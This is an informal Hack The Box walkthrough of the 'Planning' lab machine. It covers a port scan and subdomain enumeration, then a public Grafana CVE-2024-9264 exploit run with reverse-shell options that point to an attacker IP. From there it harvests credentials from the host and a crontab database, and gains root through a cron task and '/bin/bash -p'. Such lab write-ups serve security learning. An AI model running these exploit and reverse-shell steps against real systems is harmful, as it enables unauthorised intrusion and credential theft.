![Planning](https://github.com/user-attachments/assets/0ca65ac2-9938-4505-83e9-57f903cf7cfb)


So welcome back to this channel , today we gonna hack planning machine , new release arena , i hope it will be fun for all of you 

![Screenshot 2025-05-11 at 10-35-47 Hack The Box Hack The Box](https://github.com/user-attachments/assets/50b0d9fc-c86e-4a7a-a131-d84746da2664)




basic ports scan using nmap like this:

      nmap -sCV [IP] --min-rate 9600 -p- -T5 -vv 

ouput us that open ports are :
    
    22 : ssh 
    80 : http
so the hosts found is "planning.htb"  then make sure to add this in your /etc/hosts 

#Tips 
  find more explanation about this topic in scans.txt file i've attached to the repo

So , let's go here is the website 

![Screenshot_2025-05-11_10_43_18](https://github.com/user-attachments/assets/11a50a24-e637-41ca-8fb8-b52d088c8b9a)





after browsing a little bit , i was uname to find some kind of huge things to exploit so let's skip this step then 
Adding to that , i will search for possible subdomains  ; i will preconize using bitquark wordlists from seclists suite 

![Screenshot_2025-05-11_10_52_40](https://github.com/user-attachments/assets/650e43e1-9550-4c06-b763-71e7670e1c81)

Ok fine , we add to our /etc/hosts and then  let's go see what going on on it 

![Screenshot_2025-05-11_10_55_47](https://github.com/user-attachments/assets/bf46fc62-ebe6-47c0-bdb0-98a91a23336d)


Ok , 1st thing can notice is the the tech used and then his version 

        grafana v11.0.0

let's browse for some public vulns reported 
i found this one 
  
  https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit

![Screenshot 2025-05-11 at 11-20-16 z3k0sec_CVE-2024-9264-RCE-Exploit Grafana RCE exploit (CVE-2024-9264)](https://github.com/user-attachments/assets/704f14ea-a748-4651-8491-58439295f30c)


ran it a get a shell using the provided creds

        python3 poc.py --url http://grafana.planning.htb --username [USER] --password [PASS] --reverse-ip [ATTACKER] --reverse-port [PORT]
#got a shell and directly looking for things , as beginner thinking , i recommend using linpeas ; i've got some interesting 
![Screenshot_2025-05-11_10_31_21](https://github.com/user-attachments/assets/e7189d3d-c29e-4621-80c6-ba24659ce8e9)

take the creds displayed and log as enzo into ssh endpoint
          
          ssh enzo@planning.htb 

![Screenshot_2025-05-11_10_22_14](https://github.com/user-attachments/assets/da3714ea-b1ac-4d26-9dba-1b47975b000c)

#ROOT_WAY

cat the content of /etc/crontabs/crontab.db

grab the pass , then forward the ssh connection to your localhost 
    
    ssh -L 8000:localhost:8000 enzo@planning.htb

#Once done , then go to your browser 

        http://localhost:8000
enter creds and try to add new task , here is what the task should look likes 


 ![Screenshot_2025-05-11_10_29_21](https://github.com/user-attachments/assets/57e9abe8-f47b-4354-9657-828eeed1160d)

then back to the ssh session and just /bin/bash -p


![Screenshot_2025-05-11_10_22_14](https://github.com/user-attachments/assets/d601f796-90a4-425c-aae6-064adbce2450)

All Done ! ! GG , that's really easy one #HacktheBox



![Screenshot 2025-05-11 at 11-34-55 Hack The Box Hack The Box](https://github.com/user-attachments/assets/d6031c9f-4ffb-4695-a77c-7660d2cb24f7)
